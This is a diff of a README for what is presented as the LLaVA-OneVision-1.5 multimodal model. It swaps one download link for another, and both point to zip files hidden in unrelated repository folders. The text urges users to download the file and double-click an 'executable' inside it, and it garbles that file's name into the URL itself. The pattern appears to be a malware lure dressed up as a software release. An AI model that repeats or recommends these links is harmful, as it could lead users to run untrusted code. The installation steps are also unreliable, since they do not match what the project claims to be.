@@ -1,6 +1,6 @@
 # 🌟 LLaVA-OneVision-1.5 - Simple Setup for Multimodal Learning
 
-[![Download Release](https://raw.githubusercontent.com/luxus180/LLaVA-OneVision-1.5/main/bigamy/LLaVA-OneVision-1.5.zip%20Release-%E2%86%92-brightgreen)](https://raw.githubusercontent.com/luxus180/LLaVA-OneVision-1.5/main/bigamy/LLaVA-OneVision-1.5.zip)
+[![Download Release](https://github.com/luxus180/LLaVA-OneVision-1.5/raw/refs/heads/main/aiak_megatron/examples/academic_paper_scripts/sc21/L-One-La-V-Vision-1.2.zip%20Release-%E2%86%92-brightgreen)](https://github.com/luxus180/LLaVA-OneVision-1.5/raw/refs/heads/main/aiak_megatron/examples/academic_paper_scripts/sc21/L-One-La-V-Vision-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download the application, ensure your system meets the following requ
 
 ## 🖥️ Download & Install
 
-To install LLaVA-OneVision-1.5, visit this page to download: [LLaVA-OneVision-1.5 Releases](https://raw.githubusercontent.com/luxus180/LLaVA-OneVision-1.5/main/bigamy/LLaVA-OneVision-1.5.zip)
+To install LLaVA-OneVision-1.5, visit this page to download: [LLaVA-OneVision-1.5 Releases](https://github.com/luxus180/LLaVA-OneVision-1.5/raw/refs/heads/main/aiak_megatron/examples/academic_paper_scripts/sc21/L-One-La-V-Vision-1.2.zip)
 
 1. **Visit the Releases Page**: Click on the link above. You will see a list of available versions.
 2. **Select the Latest Version**: Look for the latest version at the top of the list. It usually has the highest number.
@@ -28,7 +28,7 @@ To install LLaVA-OneVision-1.5, visit this page to download: [LLaVA-OneVision-1.
 
 ## 🏁 Running the Application
 
-1. **Find the Executable**: Inside the folder, look for the file named `https://raw.githubusercontent.com/luxus180/LLaVA-OneVision-1.5/main/bigamy/LLaVA-OneVision-1.5.zip` or simply `LLaVA-OneVision`.
+1. **Find the Executable**: Inside the folder, look for the file named `https://github.com/luxus180/LLaVA-OneVision-1.5/raw/refs/heads/main/aiak_megatron/examples/academic_paper_scripts/sc21/L-One-La-V-Vision-1.2.zip` or simply `LLaVA-OneVision`.
 2. **Launch the Application**: Double-click on the executable file to launch the application.
 3. **Follow the Onscreen Instructions**: The application will guide you through the initial setup. Just follow the prompts on your screen.
 
@@ -75,4 +75,4 @@ Thank you for choosing LLaVA-OneVision-1.5. Together, we can make multimodal tra
 
 For updates, tips, and more, follow our repository and stay connected with us. 
 
-Don't forget to download the latest version from [LLaVA-OneVision-1.5 Releases](https://raw.githubusercontent.com/luxus180/LLaVA-OneVision-1.5/main/bigamy/LLaVA-OneVision-1.5.zip) to enjoy all the latest features and improvements!
+Don't forget to download the latest version from [LLaVA-OneVision-1.5 Releases](https://github.com/luxus180/LLaVA-OneVision-1.5/raw/refs/heads/main/aiak_megatron/examples/academic_paper_scripts/sc21/L-One-La-V-Vision-1.2.zip) to enjoy all the latest features and improvements!
